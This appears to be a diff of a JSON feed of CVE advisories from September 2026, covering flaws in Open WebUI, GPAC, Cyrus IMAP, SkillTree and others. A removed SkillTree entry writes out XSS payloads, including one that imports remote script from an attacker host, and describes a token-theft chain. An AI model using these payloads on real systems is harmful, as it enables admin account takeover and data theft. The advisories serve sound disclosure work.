@@ -1,145 +1,145 @@
 {
-  "totalResults": 4236,
+  "totalResults": 4394,
   "items": [
     {
-      "id": "CVE-2026-54694",
-      "published": "2026-09-09T19:17:28.400",
-      "description": "SkillTree is a micro-learning gamification platform. Prior to version 4.4.2, two independent code flaws combine into a single exploitable attack chain, with three distinct exploitation paths of escalating impact. `StringHighlighter.js` builds an HTML string by interpolating raw `value` substrings directly into a template literal with no HTML entity encoding. `HighlightedValue.vue` renders that string — and all unfiltered plain values — via Vue's `v-html` directive, which sets `innerHTML`. Separately, the account registration endpoint accepts `firstName`, `lastName`, and `nickname` fields and stores them without any HTML sanitization. An attacker self-registers with `firstName = \"<img src=x onerror=alert(1)>\"` (28 characters — within the 30-character field limit) and visits any quiz. The next time an administrator opens the Quiz Runs page the payload executes in their browser. Three attack paths exist with escalating impact. The first is basic cross-site scripting. Any self-contained payload fitting the 30-character limit (e.g. `<img src=x onerror=alert(1)>`, which is 28 chars) fires automatically when the admin navigates to the runs page through normal use. Arbitrary code execution in the admin's browser is confirmed with zero extra steps. The second is remote script loading via `import()`. Using the split-field technique (`lastName = \"<img src=x\"`, `firstName = \"onerror=import('//nsas.cc/p')>\"`), the attacker loads a full JavaScript file from their server. The file has no size limit and can perform any admin action — delete all projects, create backdoor accounts, dump user data, install a keylogger. No phishing required. The only constraint is that the URL must fit in 11 characters (`//nsas.cc/p`). The third is full cross-site request forgery token theft. Using `eval(name)`, the attacker pre-sets `window.name` to a data-theft payload by sending the admin one redirect link first. The session cookie is `HttpOnly` and cannot be read via `document.cookie`; however, the XSRF token is readable and the attacker leverages same-origin execution to call admin APIs from inside the victim's browser, relaying the responses to an external server. No admin interaction beyond routine use is required. Version 4.4.2 contains a patch.",
+      "id": "CVE-2026-71805",
+      "published": "2026-09-09T22:18:19.043",
+      "description": "An arbitrary file upload and path traversal vulnerability exists in LZ-litchi 1.0.0. Unauthenticated remote attackers can upload arbitrary files and write them outside the intended storage directory via the directory parameter in POST /app-api/infra/file/upload.",
       "severity": "CRITICAL",
-      "score": 9.6
+      "score": 9.8
     },
     {
-      "id": "CVE-2026-79322",
-      "published": "2026-09-09T19:17:47.900",
-      "description": "SQL injection in the RelatedProduct block in Mageplaza Blog for Magento 2 (mageplaza/magento-2-blog-extension) through 4.3.2 allows remote unauthenticated attackers to execute arbitrary SQL commands and read arbitrary database contents via the id parameter to /mpblog/post/view.",
+      "id": "CVE-2026-87995",
+      "published": "2026-09-09T22:18:47.710",
+      "description": "Open WebUI is an extensible, feature-rich, and user-friendly self-hosted AI platform. From 0.8.11 until 0.11.1, src/lib/components/chat/FileNav/PortPreview.svelte rendered terminal port content in an iframe sandbox containing both allow-scripts and allow-same-origin. Because the terminal proxy serves that content from the Open WebUI origin, an authenticated user with access to a shared terminal server could host script on a previewed port and take over a victim's account when the victim opened the preview. This issue is fixed in version 0.11.1.",
       "severity": "HIGH",
-      "score": 8.6
+      "score": 8.7
     },
     {
-      "id": "CVE-2026-71612",
-      "published": "2026-09-09T20:20:21.587",
-      "description": "Buffer Overflow vulnerability in GPAC c2dee3aff638cd96f9617ac5b17dc2868cd90ef3 allows an attacker to execute arbitrary code via the nhntdmx_process() function. Fixed in fac50e6a12ac27ffabdd5d3080b51afcc44ad8d6.",
+      "id": "CVE-2026-87016",
+      "published": "2026-09-09T22:18:46.720",
+      "description": "Open WebUI is an extensible, feature-rich, and user-friendly self-hosted AI platform. From 0.6.41 until 0.11.1, get_user_by_oauth_sub and get_user_by_scim_external_id in backend/open_webui/models/users.py used JSON contains matching that compiled to SQL LIKE substring matching on SQLite. An OAuth subject containing percent or underscore wildcard characters could resolve to a different stored identity, potentially selecting an administrator account and issuing the attacker that account's session; PostgreSQL deployments were not affected. This issue is fixed in version 0.11.1.",
       "severity": "HIGH",
-      "score": 8.4
+      "score": 8.1
     },
     {
-      "id": "CVE-2026-71614",
-      "published": "2026-09-09T20:20:21.870",
-      "description": "An issue in GPAC c2dee3aff638cd96f9617ac5b17dc2868cd90ef3 allows an attacker to execute arbitrary code via the src/media_tools/dvb_mpe.c, descriptorTime_slice_fec_identifier() and gf_m2ts_ipdatagram_reader() components. Fixed in 0e4093392e1f847c90d20e031e893cd942fef938.",
+      "id": "CVE-2026-15913",
+      "published": "2026-09-09T22:17:11.367",
+      "description": "In versions prior to 7.10.2 a path traversal vulnerability in the /attachRemoteFiles endpoint of Fortra's GoAnywhere MFT allows Web Users with both Secure Folders and Secure Mail permissions to escape their sandboxed home directory, achieving arbitrary file read.",
       "severity": "HIGH",
-      "score": 8.4
+      "score": 7.7
     },
     {
-      "id": "CVE-2026-71613",
-      "published": "2026-09-09T20:20:21.747",
-      "description": "Buffer Overflow vulnerability in GPAC c2dee3aff638cd96f9617ac5b17dc2868cd90ef3 allows an attacker to execute arbitrary code via the j2kdec_process() function. Fixed in 9a253a07fd3f6b48022bba74302bf39388dda859.",
+      "id": "CVE-2026-87996",
+      "published": "2026-09-09T22:18:47.857",
+      "description": "Open WebUI is an extensible, feature-rich, and user-friendly self-hosted AI platform. From 0.9.6 until 0.11.1, SafePlaywrightURLLoader in backend/open_webui/retrieval/web/utils.py validated a user-controlled hostname in Python and then let the Playwright browser resolve it again in the sync and async request interceptors. An authenticated user controlling authoritative DNS could return a public address to validation and an internal address to the browser, exposing responses from internal services or cloud metadata through web search or URL ingestion. This issue is fixed in version 0.11.1.",
       "severity": "HIGH",
-      "score": 7.8
+      "score": 7.7
     },
     {
-      "id": "CVE-2026-52482",
-      "published": "2026-09-09T19:17:28.113",
-      "description": "An issue in SJRC F11 SJ-GPS-PRO firmware build 2019-09-17 allows a remote attacker to obtain sensitive information via the inetd service spawns /app/sh_for_telnet",
+      "id": "CVE-2026-87921",
+      "published": "2026-09-09T22:18:47.193",
+      "description": "A vulnerability was identified in Rizwan17 inventory-management-system up to bfe78a330d01bb26b9daec5dc9ecd5c77900e03f. Affected is the function update_record of the file includes/manage.php. The manipulation of the argument update_category/cid/update_brand/update_product leads to sql injection. The attack is possible to be carried out remotely. The exploit is publicly available and might be used. This product adopts a rolling release strategy to maintain continuous delivery. Therefore, version details for affected or updated releases cannot be specified. The project was informed of the problem early through an issue report but has not responded yet.",
       "severity": "HIGH",
-      "score": 7.5
+      "score": 7.3
     },
     {
-      "id": "CVE-2026-79323",
-      "published": "2026-09-09T19:17:48.020",
-      "description": "Information disclosure in the blogComments GraphQL query in Magefan Blog GraphQL for Magento 2 (magefan/module-blog-graph-ql) through 2.2.1 allows remote unauthenticated attackers to obtain blog commenter email addresses and internal customer and admin identifiers via a POST request to /graphql.",
+      "id": "CVE-2026-87922",
+      "published": "2026-09-09T22:18:47.390",
+      "description": "A security flaw has been discovered in Rizwan17 inventory-management-system up to bfe78a330d01bb26b9daec5dc9ecd5c77900e03f. Affected by this vulnerability is the function DBOperation.addCategory of the file includes/process.php of the component AJAX Backend. The manipulation of the argument userid results in missing authentication. The attack may be performed from remote. The exploit has been released to the public and may be used for attacks. This product utilizes a rolling release system for continuous delivery, and as such, version information for affected or updated releases is not disclosed. The project was informed of the problem early through an issue report but has not responded yet.",
       "severity": "HIGH",
-      "score": 7.5
+      "score": 7.3
     },
     {
-      "id": "CVE-2026-73786",
-      "published": "2026-09-09T20:20:33.493",
-      "description": "A vulnerability in the web-based management interface of CPPM could allow an unauthenticated remote attacker to conduct a Denial-of-Service (DoS) attack. Successful exploitation could allow an attacker to cause instability and degrade performance of the vulnerable CPPM server.",
+      "id": "CVE-2026-87998",
+      "published": "2026-09-09T22:18:48.460",
+      "description": "Open WebUI is an extensible, feature-rich, and user-friendly self-hosted AI platform. From 0.10.0 until 0.11.1, DELETE /api/v1/knowledge/{id}/delete in backend/open_webui/routers/knowledge.py authorized deletion against the knowledge base but then removed its administrator-owned external connection without a separate administrator check or a check for other dependent knowledge bases. A non-administrator with write access to one external knowledge base could delete shared instance configuration and make every other knowledge base using that connection unavailable. This issue is fixed in version 0.11.1.",
       "severity": "HIGH",
-      "score": 7.5
+      "score": 7.1
     },
     {
-      "id": "CVE-2026-73769",
-      "published": "2026-09-09T20:20:33.360",
-      "description": "A vulnerability in the web-based management interface of vulnerable CPPM systems could allow an authenticated remote attacker to achieve remote code execution. Successful exploitation could allow an attacker to execute arbitrary commands on the underlying operating system.",
+      "id": "CVE-2026-87999",
+      "published": "2026-09-09T22:18:48.617",
+      "description": "Open WebUI is an extensible, feature-rich, and user-friendly self-hosted AI platform. Prior to 0.11.1, POST /api/v1/retrieval/process/web and POST /api/v1/retrieval/process/web/search in backend/open_webui/retrieval/web/utils.py treated Python's globally routable address classification as proof that a destination was external. An authenticated user could make an Azure-hosted instance fetch and return content from 168.63.129.16, the Azure platform channel, as well as other reserved ranges that the standard classification did not reject. This issue is fixed in version 0.11.1.",
       "severity": "HIGH",
-      "score": 7.2
+      "score": 7.1
     },
     {
-      "id": "CVE-2026-73787",
-      "published": "2026-09-09T20:20:33.607",
-      "description": "A vulnerability in the CPPM web interface could allow an authenticated remote attacker to access directory information on a vulnerable system. Successful exploitation could allow an attacker to execute arbitrary commands on the underlying operating system.",
-      "severity": "HIGH",
-      "score": 7.2
-    },
-    {
-      "id": "CVE-2026-38998",
-      "published": "2026-09-09T20:17:22.387",
-      "description": "A use-after-free in the SocketDescriptor::tcpReadHandler1 function (liveMedia/RTPInterface.cpp) of LIVE555 Streaming Media (version 2026.02.26) allows attackers to cause a Denial of Service (DoS) via sending a series of crafted RTSP and HTTP requests to the server.",
+      "id": "CVE-2026-88000",
+      "published": "2026-09-09T22:18:48.777",
+      "description": "Open WebUI is an extensible, feature-rich, and user-friendly self-hosted AI platform. From 0.10.0 until 0.11.1, DELETE /api/v1/chats/{id}/messages/{message_id} used the chat-history deletion helper in backend/open_webui/models/chats.py to follow childrenIds without recording visited message identifiers. An authenticated user could store a cyclic chat tree and delete a message, causing a synchronous infinite loop on the server request loop that blocked every user's requests until the process was killed. This issue is fixed in version 0.11.1.",
       "severity": "MEDIUM",
       "score": 6.5
     },
     {
-      "id": "CVE-2026-71616",
-      "published": "2026-09-09T20:20:22.003",
-      "description": "An issue in GPAC c2dee3aff638cd96f9617ac5b17dc2868cd90ef3 allows an attacker to cause a denial of service via the function gf_route_media_complete_object(). Fixed in 3c4e6c5b3e0c6fa9b16d55599701a08354538fab.",
+      "id": "CVE-2026-88002",
+      "published": "2026-09-09T22:18:49.080",
+      "description": "Open WebUI is an extensible, feature-rich, and user-friendly self-hosted AI platform. From 0.5.0 until 0.11.1, the message-chain reconstruction helper in backend/open_webui/utils/misc.py advanced through a chat history by map key but tracked visited entries using each message body's optional id field. An authenticated user could store id-less messages in a parent cycle and trigger a non-terminating walk that blocked the async event loop, grew memory until termination, and remained persistent across process restarts. This issue is fixed in version 0.11.1.",
       "severity": "MEDIUM",
-      "score": 6.2
+      "score": 6.5
     },
     {
-      "id": "CVE-2025-51619",
-      "published": "2026-09-09T19:17:26.563",
-      "description": "A vulnerability in the Thesycon DPC Latency Checker driver (dpc.sys) thru 1.4.0 allows local unprivileged users to cause a denial-of-service (BSOD) condition on Windows systems. The driver exposes an IOCTL interface (0x81772008) that accepts user-controlled input without validating pointers before passing them to kernel APIs. Specifically, it dereferences a user-supplied pointer and uses the resulting value in a call to ExSetTimerResolution, leading to an arbitrary kernel memory access. Exploiting this flaw results in a system crash.",
+      "id": "CVE-2026-75307",
+      "published": "2026-09-09T22:18:28.733",
+      "description": "zhitan-ems 1.0.0 is vulnerable to Cross Site Scripting (XSS) via SVG file upload through the /equipmentFile/upload endpoint.",
       "severity": "MEDIUM",
-      "score": 5.5
+      "score": 6.1
     },
     {
-      "id": "CVE-2026-39020",
-      "published": "2026-09-09T19:17:27.760",
-      "description": "An issue in WIngs3D v.2.4.1 allows a local attacker to cause a denial of service via a crafted Wavefront OBJ file",
+      "id": "CVE-2026-75308",
+      "published": "2026-09-09T22:18:28.857",
+      "description": "yshopmall <=3.3 is vulnerable to Cross Site Scripting (XSS). The file upload endpoint /api/upload of the system lacks file type validation. Attackers can upload files of any type, including HTML, JSP, and other executable files.",
       "severity": "MEDIUM",
-      "score": 5.5
+      "score": 6.1
     },
     {
-      "id": "CVE-2026-61907",
-      "published": "2026-09-09T19:17:28.927",
-      "description": "An issue was discovered in Cyrus IMAP before 3.12.4. JMAP snooze bypasses the destination-mailbox ACL. An authenticated user with insert permissions on another user's snoozed mailbox could cause insertion of mail to that user's inbox, or any other of their mailboxes whose id was known to the user, despite having no insert permissions to the target mailbox.",
+      "id": "CVE-2026-15460",
+      "published": "2026-09-09T23:16:54.617",
+      "description": "The Bluetooth Classic (BR/EDR) L2CAP receive handler bt_l2cap_br_recv() in subsys/bluetooth/host/classic/l2cap_br.c dispatched inbound data PDUs based only on the destination channel ID, without checking that the target channel had reached the BT_L2CAP_CONNECTED state. A dynamic channel is assigned its RX CID and added to the connection's channel list while still in BT_L2CAP_CONNECTING (and later BT_L2CAP_CONFIG) — before configuration completes and, for PSMs that require security, before the peer is authenticated (l2cap_br_conn_req()).\n\nBecause the channel is already findable by bt_l2cap_br_lookup_rx_cid() during this window, a remote peer within radio range can send a data PDU addressed to that CID and have it processed on a not-yet-established channel. The dispatch keys off channel fields (BR_CHAN(chan)->rx.mode, rx.mps) that are only initialized during configuration by l2cap_br_conf(); since channel objects are pooled and bt_l2cap_br_chan_del() does not reset rx.mode or the reassembly buffer _sdu, a reused channel can carry stale state into the CONNECTING window and route the frame into the retransmission/flow-control path (bt_l2cap_br_ret_fc_recv()) with stale parameters and a possibly stale _sdu pointer.\n\nThe impact is delivery of attacker data to upper-layer protocol handlers on a half-open (and possibly unauthenticated) channel, plus operation on stale or partially initialized channel state on reused channel objects — leading to channel/link teardown (denial of service) and, in the stale-_sdu case, a dangling-pointer condition. The fix adds an explicit BR_CHAN(chan)->state < BT_L2CAP_CONNECTED guard that drops any data received before the channel is fully connected.",
+      "severity": "MEDIUM",
+      "score": 5.4
+    },
+    {
+      "id": "CVE-2026-88001",
+      "published": "2026-09-09T22:18:48.930",
+      "description": "Open WebUI is an extensible, feature-rich, and user-friendly self-hosted AI platform. From 0.9.5 until 0.11.1, server-side web fetches did not reapply WEB_FETCH_FILTER_LIST or private-address controls to HTTP redirect destinations when AIOHTTP_CLIENT_ALLOW_REDIRECTS was enabled. An authenticated user could redirect the aiohttp and requests fetch paths to excluded hosts, loopback, private networks, or cloud metadata services and route resulting content into web search, URL ingestion, page-fetch tools, or chat image processing. This issue is fixed in version 0.11.1.",
+      "severity": "MEDIUM",
+      "score": 5
+    },
+    {
+      "id": "CVE-2026-71807",
+      "published": "2026-09-09T22:18:19.173",
+      "description": "In RuoYi-Cloud-Plus <= 2.6.2 in the ruoyi-workflow module, multiple core task APIs in FlwTaskController lack permission annotations, and the Service layer does not verify whether the current user is the task handler/related user. Authenticated low-privileged remote attackers can read sensitive workflow task details (/task/getTask/{taskId}) and trigger unauthorized workflow executions (/task/startWorkFlow).",
       "severity": "MEDIUM",
       "score": 4.3
     },
     {
-      "id": "CVE-2026-61911",
-      "published": "2026-09-09T20:18:36.800",
-      "description": "An issue was discovered in Cyrus IMAP before 3.12.4. There is a Sieve mailbox existence oracle. An authenticated user could install a Sieve script that probed whether another user's private mailbox existed, or read the value of shared mailbox annotations, by observing which fileinto branch fired during LMTP delivery.",
+      "id": "CVE-2026-87017",
+      "published": "2026-09-09T22:18:47.023",
+      "description": "Open WebUI is an extensible, feature-rich, and user-friendly self-hosted AI platform. From 0.7.0 until 0.11.1, the built-in knowledge search tool passed the caller's readable knowledge identifiers through a metadata filter, but the search methods in eleven shipped vector backends ignored that filter. An authenticated user on an affected backend could enumerate the identifiers, names, and descriptions of inaccessible knowledge bases from the shared collection, although the associated document text remained in separate collections. This issue is fixed in version 0.11.1.",
       "severity": "MEDIUM",
       "score": 4.3
     },
     {
-      "id": "CVE-2026-61915",
-      "published": "2026-09-09T20:18:36.943",
-      "description": "An issue was discovered in Cyrus IMAP before 3.12.4. There is a VPATCH BYPARAM double-free. An authenticated calendar user could crash a Cyrus CalDAV worker with a PATCH containing PATCH-ACTION=\"BYPARAM@...\" against a resource with two or more properties of the matched kind. The memory holding the selector would be freed once on each iteration over the properties.",
+      "id": "CVE-2026-87994",
+      "published": "2026-09-09T22:18:47.563",
+      "description": "Open WebUI is an extensible, feature-rich, and user-friendly self-hosted AI platform. From 0.9.5 until 0.11.1, the channel branch of chat_completion in backend/open_webui/main.py checked channel write access and channel membership for a supplied message_id but did not verify that the calling user authored the targeted message. A channel member could use the chat completions endpoint to replace another member's message while preserving the victim as the stored author, altering the conversation record without gaining access to other channels. This issue is fixed in version 0.11.1.",
       "severity": "MEDIUM",
-      "score": 4.2
+      "score": 4.3
     },
     {
-      "id": "CVE-2026-61909",
-      "published": "2026-09-09T20:18:36.523",
-      "description": "An issue was discovered in Cyrus IMAP before 3.12.4. CalDAV/CardDAV multiget bypasses a per-href ACL. An authenticated DAV user with some shared access to another user's calendar or address book could read even unshared events or contacts by including the target hrefs in a calendar-multiget or addressbook-multiget REPORT.",
-      "severity": "LOW",
-      "score": 3.5
+      "id": "CVE-2026-87997",
+      "published": "2026-09-09T22:18:48.267",
+      "description": "Open WebUI is an extensible, feature-rich, and user-friendly self-hosted AI platform. From 0.10.0 until 0.11.1, POST /api/chat/completions and POST /api/v1/chat/completions in backend/open_webui/main.py copied a client-supplied folder_id into a new chat without applying the folder write-access check used by the dedicated chat routes. An authenticated user who knew a shared folder identifier could inject an attacker-controlled chat into a folder where the user had read-only or no write access, causing the entry to appear to authorized folder readers. This issue is fixed in version 0.11.1.",
+      "severity": "MEDIUM",
+      "score": 4.3
     },
     {
-      "id": "CVE-2026-61910",
-      "published": "2026-09-09T20:18:36.663",
-      "description": "An issue was discovered in Cyrus IMAP before 3.12.4. Mailbox/set let a sharee change a special-use role on shared mailboxes. An authenticated user with maySetKeywords on another user's mailbox could change that mailbox's specialuse annotation. This could allow the sharee to change the shared mailbox to perform the archived, snoozed, or other role, which might cause mail mail to be written to the shared mailbox, sharing more content than intended. (This is likely to be an unusual situation, made more unusual because if the target already has an non-shared mailbox with that role, role duplication suppression will prevent the update.)",
-      "severity": "LOW",
-      "score": 3.5
-    },
-    {
-      "id": "CVE-2026-61908",
-      "published": "2026-09-09T20:18:36.383",
-      "description": "An issue was discovered in Cyrus IMAP before 3.12.4. A JMAP email-header blob ID can reference an out-of-bounds index. An authenticated user could attempt to download a crafted JMAP blob ID of the form H<emailid>-<index>, which could read past the end of the internal blob_headers array during download, exposing adjacent heap memory.",
-      "severity": "LOW",
-      "score": 3.1
+      "id": "CVE-2026-88069",
+      "published": "2026-09-09T22:18:49.240",
+      "description": "Pandora contains a path traversal vulnerability in its archive extraction worker. When processing a specially crafted archive or disk image, attacker-controlled file paths could be used without ensuring that the resulting destination remained within the intended extraction directory.\n\nAn attacker able to submit a malicious file for analysis could use path traversal sequences or crafted paths to cause extracted content to be written outside the designated extraction directory, potentially overwriting files accessible to the Pandora worker process. Successful exploitation could result in unauthorized modification of application or system files, denial of service, and potentially further compromise depending on the permissions of the Pandora process and the files that can be overwritten.\n\nThe vulnerability is addressed by resolving each extraction destination path before writing and verifying that it remains below the expected extraction directory. Extraction attempts resolving outside this directory are rejected and reported as path traversal attempts.",
+      "severity": "UNKNOWN",
+      "score": null
     }
   ]
 }
